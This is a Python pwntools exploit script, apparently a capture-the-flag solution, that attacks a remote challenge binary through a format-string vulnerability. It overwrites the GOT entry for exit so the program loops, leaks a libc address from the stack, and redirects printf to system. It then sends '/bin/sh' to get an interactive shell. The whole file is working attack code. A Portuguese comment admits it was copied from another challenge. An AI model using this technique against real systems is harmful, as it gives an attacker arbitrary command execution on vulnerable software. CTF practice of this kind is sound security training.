#!/usr/bin/env python3

from pwn import *

e = ELF("./bin_patched")
libc = ELF("./libc-2.23.so")
ld = ELF("./ld-2.23.so")

context.binary = e

def conn(cond):
    if cond == 1:
        r = process([e.path])
    elif cond == 2:
        r = gdb.debug([e.path], gdbscript="""
            
            """)
    elif cond == 3:
        r = remote("mustard.stt.rnl.tecnico.ulisboa.pt", 10154)

    return r


def main():
    r = conn(3)



    writes = {  e.got["exit"]: e.symbols["parse_loop"] }
    offset = 6
    payload = fmtstr_payload(offset, writes,  badbytes=frozenset(b" "))
    r.sendline(payload)

    # was a copy of the challenge of format Strigs é preciso checkar se o aslr está ligado ou não e se e mudar os endereços das coias tmb-------------
    r.sendline(b"AAAA" + b".%08x"*10) # leak the stack address of buff


    offset = 6
    r.recvuntil(b"AAAA.")
    r.recvuntil(b".")
    leakStdio = int(r.recvuntil(b".")[:-1],16)

    libc.address = leakStdio - libc.symbols["_IO_2_1_stdin_"]


    print("leakStdio: " + hex(leakStdio))

    writes = {e.got["printf"]: libc.symbols["system"]}
    payload = fmtstr_payload(offset, writes,  badbytes=frozenset(b" "))

    print(payload)
    r.sendline(payload)
    r.sendline(b"/bin/sh\x00")


    r.interactive()

if __name__ == "__main__":
    main()